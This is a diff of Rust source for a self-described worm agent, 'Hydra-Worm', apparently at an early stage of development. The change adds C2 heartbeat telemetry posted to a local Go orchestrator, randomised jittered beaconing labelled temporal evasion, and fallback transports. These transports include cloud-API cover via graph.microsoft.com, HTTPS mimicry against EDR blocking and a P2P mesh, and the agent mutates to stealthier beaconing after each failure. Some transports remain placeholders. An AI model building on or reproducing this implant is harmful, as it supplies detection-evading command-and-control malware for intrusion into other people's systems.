@@ -1,23 +1,53 @@
 // Project: Hydra-Worm Agent
-// Phase: 1.2 - Temporal Evasion (Poisson Jitter)
+// Phase: 1.3 - Orchestrator Integration
+// Logic: Temporal Evasion + Multi-tier Mutation + Live C2 Telemetry
 
 use std::thread;
 use std::time::Duration;
 use rand_distr::{Distribution, Exp};
 use rand::thread_rng;
+use serde::Serialize;
+
+/// Data structure for C2 communication (Matches Go Orchestrator)
+#[derive(Serialize)]
+struct Telemetry {
+    agent_id: String,
+    transport: String,
+    status: String,
+    lambda: f64,
+}
 
 /// The core contract for all communication modules.
 trait Transport {
-    fn send_heartbeat(&self) -> Result<(), &'static str>;
+    fn send_heartbeat(&self, stats: &Telemetry) -> Result<(), String>;
     fn get_name(&self) -> String;
 }
 
 // --- TRANSPORT TIER 1: CLOUD API ---
 struct CloudTransport { endpoint: String }
 impl Transport for CloudTransport {
-    fn send_heartbeat(&self) -> Result<(), &'static str> {
+    fn send_heartbeat(&self, stats: &Telemetry) -> Result<(), String> {
         println!("[!] C2-CLOUD: Attempting connection to {}...", self.endpoint);
-        Err("403 Forbidden") 
+        
+        let client = reqwest::blocking::Client::builder()
+            .timeout(Duration::from_secs(5))
+            .build()
+            .map_err(|e| e.to_string())?;
+
+        // In a real scenario, this would be the Cloud API URL
+        // For local R&D, we point to our Go Orchestrator
+        let url = "http://localhost:8080/api/v1/heartbeat";
+
+        let res = client.post(url)
+            .json(stats)
+            .send()
+            .map_err(|e| format!("Network Error: {}", e))?;
+
+        if res.status().is_success() {
+            Ok(())
+        } else {
+            Err(format!("HTTP Error: {}", res.status()))
+        }
     }
     fn get_name(&self) -> String { "Cloud-API".into() }
 }
@@ -25,9 +55,10 @@ impl Transport for CloudTransport {
 // --- TRANSPORT TIER 2: MALLEABLE DIRECT ---
 struct MalleableTransport { c2_ip: String }
 impl Transport for MalleableTransport {
-    fn send_heartbeat(&self) -> Result<(), &'static str> {
+    fn send_heartbeat(&self, _stats: &Telemetry) -> Result<(), String> {
         println!("[!] C2-DIRECT: Mimicking HTTPS to {}...", self.c2_ip);
-        Err("TCP RST")
+        // Placeholder for Phase 1.4: Malleable Profiles
+        Err("TCP RST - EDR Block".into())
     }
     fn get_name(&self) -> String { "Malleable-Direct".into() }
 }
@@ -35,8 +66,9 @@ impl Transport for MalleableTransport {
 // --- TRANSPORT TIER 3: P2P MESH ---
 struct P2PTransport;
 impl Transport for P2PTransport {
-    fn send_heartbeat(&self) -> Result<(), &'static str> {
+    fn send_heartbeat(&self, _stats: &Telemetry) -> Result<(), String> {
         println!("[!] C2-P2P: Broadcasting to local mesh...");
+        // Placeholder for Phase 3.2: P2P Mesh
         Ok(())
     }
     fn get_name(&self) -> String { "P2P-Gossip-Mesh".into() }
@@ -44,28 +76,27 @@ impl Transport for P2PTransport {
 
 // --- THE ENGINE ---
 struct Agent {
+    id: String,
     transport: Box<dyn Transport>,
     failures: u32,
     state: u8,
-    lambda: f64, // Average heartbeats per second
+    lambda: f64,
 }
 
 impl Agent {
-    fn new() -> Self {
+    fn new(id: &str) -> Self {
         Self {
+            id: id.to_string(),
             transport: Box::new(CloudTransport { endpoint: "graph.microsoft.com".into() }),
             failures: 0,
             state: 0,
-            lambda: 0.2, // Default: ~1 heartbeat every 5 seconds
+            lambda: 0.2, 
         }
     }
 
-    /// Calculates the next stochastic sleep interval based on an Exponential Distribution
     fn get_next_sleep(&self) -> Duration {
         let exp = Exp::new(self.lambda).unwrap();
         let seconds = exp.sample(&mut thread_rng());
-        
-        // Safety bounds: Min 1s, Max 60s to keep the simulation controlled
         let capped_seconds = seconds.min(60.0).max(1.0);
         
         println!("[?] Jitter Engine: λ={:.2} | Next heartbeat in {:.2}s", self.lambda, capped_seconds);
@@ -75,8 +106,19 @@ impl Agent {
     fn run(&mut self) {
         loop {
             println!("\n[*] Strategy: {}", self.transport.get_name());
-            match self.transport.send_heartbeat() {
-                Ok(_) => self.failures = 0,
+            
+            let stats = Telemetry {
+                agent_id: self.id.clone(),
+                transport: self.transport.get_name(),
+                status: "OK".into(),
+                lambda: self.lambda,
+            };
+
+            match self.transport.send_heartbeat(&stats) {
+                Ok(_) => {
+                    println!("[+] Heartbeat Acknowledged by C2.");
+                    self.failures = 0;
+                },
                 Err(e) => {
                     println!("[-] Failure: {}", e);
                     self.failures += 1;
@@ -87,7 +129,6 @@ impl Agent {
                 self.mutate();
             }
 
-            // Apply Temporal Evasion
             thread::sleep(self.get_next_sleep());
         }
     }
@@ -97,11 +138,10 @@ impl Agent {
         self.failures = 0;
         println!("[!!!] ALERT: Triggering Transport Mutation...");
 
-        // Adjust lambda based on state: be "slower" (stealthier) as we lose options
         self.lambda = match self.state {
-            0 => 0.2,  // Cloud: Normal
-            1 => 0.1,  // Direct: Slower
-            _ => 0.05, // P2P: Very Slow (1 every 20s avg)
+            0 => 0.2,
+            1 => 0.1,
+            _ => 0.05,
         };
 
         self.transport = match self.state {
@@ -126,11 +166,11 @@ fn display_splash() {
                 /_/                              
     "#;
     println!("{}", banner);
-    println!("      [ Phase 1.2 - Temporal Evasion Active ]\n");
+    println!("      [ Phase 1.3 - Orchestrator Integration Active ]\n");
 }
 
 fn main() {
     display_splash();
-    let mut agent = Agent::new();
+    let mut agent = Agent::new("HYDRA-TEST-01");
     agent.run();
 }
